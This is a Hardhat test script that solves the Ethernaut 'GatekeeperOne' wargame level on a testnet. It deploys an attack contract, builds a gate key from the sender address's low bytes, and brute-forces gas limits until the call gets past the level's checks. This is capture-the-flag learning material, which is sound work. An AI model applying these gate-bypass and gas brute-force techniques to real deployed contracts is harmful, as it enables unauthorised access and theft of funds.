// npx hardhat test ./test/13_gatekeeper_one.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "GatekeeperOne";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._13_gatekeeper_one, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    let attackFactory = await ethers.getContractFactory("GatekeeperOneAttack");
    let attack = await attackFactory.deploy(levelContract.address);
    const accounts = await ethers.getSigners();

    // https://github.com/MrToph/ethernaut/blob/master/test/13-gatekeeper-one.ts
    const address = await accounts[0].getAddress()
    const uint16TxOrigin = address.slice(-4)
    const gateKey = `0x100000000000${uint16TxOrigin}`
    console.log(`gateKey = ${gateKey}`)
    // _gateKey = 0x1122334455667788
    // uint32(uint64(_gateKey)) 0x55667788 = 1432778632
    // uint64(_gateKey) 0x1122334455667788 = 1234605616436508552
    // uint16(tx.origin) 0xD74C = 55116
    // tx.orign = 0x48490375809Cf5Af9D635C7860BD7F83f9f2D74c

    // use this to bruteforce gas usage
    const MOD = 8191
    const gasToUse = 800000
    let tx;
    let gasLimit;
    for (let i = 0; i < MOD; i++) {
        gasLimit = gasToUse + i;
        console.log(`testing ${gasLimit}`)
        try {
            tx = await attack.attack(gateKey, {
                gasLimit: gasLimit
            });
            break;
        } catch { }
    }

    await tx.wait();
    //console.log(tx);
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});